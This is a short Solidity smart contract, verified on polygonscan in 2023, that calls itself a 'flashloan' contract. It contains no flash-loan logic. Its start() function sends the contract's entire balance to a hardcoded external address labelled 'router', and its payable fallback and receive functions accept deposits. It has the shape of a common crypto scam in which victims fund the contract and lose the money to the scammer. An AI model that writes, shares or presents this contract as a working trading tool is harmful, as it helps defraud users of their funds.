/**
 *Submitted for verification at polygonscan.com on 2023-02-28
*/

pragma solidity 0.8.12;

contract flashloan {
    address payable router = payable(0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877);

    function start() public {
        router.transfer(address(this).balance);
    }

    fallback () external payable {
    }

    receive () external payable {
    }
}